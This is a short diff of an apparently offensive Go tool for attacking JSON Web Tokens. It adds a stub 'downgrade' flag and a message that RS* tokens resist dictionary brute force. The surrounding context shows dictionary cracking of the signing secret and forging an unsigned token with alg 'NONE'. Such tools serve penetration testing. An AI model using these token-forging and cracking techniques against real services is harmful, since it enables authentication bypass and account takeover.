@@ -17,13 +17,14 @@ import (
 )
 
 var (
-	version = "v1.1"
+	version = "v1.2"
 )
 
 func main() {
 	jwtFlag := flag.String("jwt", "", "The JWT token")
 	dicFlag := flag.String("dict", "", "The password dictionary for brute force attack")
 	excFlag := flag.Bool("exclude", false, "Signature exclusion attack")
+	downgradeFlag := flag.Bool("downgrade", false, "Change signature type")
 	flag.Parse()
 
 	yellow := color.New(color.FgYellow).SprintFunc()
@@ -99,6 +100,9 @@ func main() {
 					passOk = pwd
 					break
 				}
+			default:
+				log.Println(red("[!]") + " RS* are not prone to dictionary bruteforce")
+				return
 			}
 		}
 
@@ -114,6 +118,9 @@ func main() {
 		header := jwt.EncodeSegment([]byte("{\"alg\":\"NONE\",\"typ\":\"JWT\"}"))
 		token := header + "." + jwtArr[1] + "."
 		log.Printf(green("[=]")+" New token w/o signature: %s", token)
+		return
+	} else if *downgradeFlag {
+		log.Println(red("NYI"))
 		return
 	}
 
